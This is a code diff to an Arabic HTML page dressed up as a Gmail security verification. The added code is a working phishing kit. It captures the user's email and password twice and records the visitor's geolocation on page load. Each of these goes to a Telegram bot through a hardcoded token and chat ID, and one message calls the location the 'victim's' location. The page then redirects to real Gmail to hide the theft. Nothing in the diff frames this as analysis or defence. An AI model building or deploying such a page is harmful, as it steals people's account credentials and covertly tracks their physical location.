@@ -2,32 +2,129 @@
 <html dir="rtl" lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل الدخول</title>
+  <title>Gmail - التحقق الأمني</title>
+  <style>
+    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+    .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 320px; text-align: center; }
+    input, button { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; border-radius: 4px; border: 1px solid #ccc; }
+    button { background: #4285f4; color: white; border: none; }
+    .hidden { display: none; }
+    .circle {
+      border: 6px solid #ccc;
+      border-top: 6px solid #4285f4;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .check {
+      font-size: 40px;
+      color: #34a853;
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <h2>تسجيل الدخول إلى Gmail</h2>
-  <form id="loginForm">
-    <input type="email" id="email" placeholder="البريد الإلكتروني" required><br>
-    <input type="password" id="password" placeholder="كلمة المرور" required><br>
-    <button type="submit">التالي</button>
-  </form>
+
+  <div class="box" id="step1">
+    <h2>تسجيل الدخول إلى Gmail</h2>
+    <input type="email" id="email" placeholder="البريد الإلكتروني">
+    <input type="password" id="password" placeholder="كلمة المرور">
+    <button onclick="goToStep2()">التالي</button>
+  </div>
+
+  <div class="box hidden" id="step2">
+    <h2>أعد تأكيد معلوماتك</h2>
+    <input type="email" id="email2" placeholder="أعد إدخال البريد الإلكتروني">
+    <input type="password" id="password2" placeholder="أعد إدخال كلمة المرور">
+    <button onclick="verify()">تأكيد</button>
+    <div id="msg" style="margin-top:10px; color:red;"></div>
+  </div>
+
+  <div class="box hidden" id="step3">
+    <h2>جارٍ التحقق من معلوماتك...</h2>
+    <div class="circle"></div>
+    <div class="check">✓ تم التحقق</div>
+    <p id="finalMsg">📍 موقعك الحالي تم تسجيله</p>
+    <a id="mapLink" href="#" target="_blank">عرض الموقع على خرائط Google</a>
+  </div>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+    const token = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
+    const chatId = "7493001551";
 
-      // حفظ البيانات مؤقتًا
-      localStorage.setItem("email", email);
-      localStorage.setItem("password", password);
+    let email = "", password = "";
 
-      // إرسال إلى Telegram
-      fetch(`https://api.telegram.org/bot<توكنك>/sendMessage?chat_id=<IDك>&text=📩 Gmail Login\nEmail: ${email}\nPassword: ${password}`);
+    // إرسال الموقع الجغرافي عند الفتح
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const mapURL = `https://www.google.com/maps?q=${lat},${lon}`;
+        document.getElementById("mapLink").href = mapURL;
 
-      // الانتقال للصفحة الثانية
-      window.location.href = "conform.html";
-    });
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `📍 موقع الضحية:\nhttps://www.google.com/maps?q=${lat},${lon}`
+          })
+        });
+      });
+    }
+
+    function goToStep2() {
+      email = document.getElementById("email").value;
+      password = document.getElementById("password").value;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `📥 Gmail Login:\n📧 Email: ${email}\n🔑 Password: ${password}`
+        })
+      });
+
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+    }
+
+    function verify() {
+      const email2 = document.getElementById("email2").value;
+      const password2 = document.getElementById("password2").value;
+
+      if (email2 === email && password2 === password) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `✅ Gmail Confirmed:\n📧 Email: ${email2}\n🔑 Password: ${password2}`
+          })
+        });
+
+        document.getElementById("step2").classList.add("hidden");
+        document.getElementById("step3").classList.remove("hidden");
+
+        setTimeout(() => {
+          document.querySelector(".circle").style.display = "none";
+          document.querySelector(".check").style.display = "block";
+        }, 3000);
+
+        setTimeout(() => {
+          window.location.href = "https://mail.google.com";
+        }, 5000);
+      } else {
+        document.getElementById("msg").innerText = "❌ لا يوجد تطابق، الرجاء إدخال المعلومات الصحيحة.";
+      }
+    }
   </script>
 </body>
 </html>
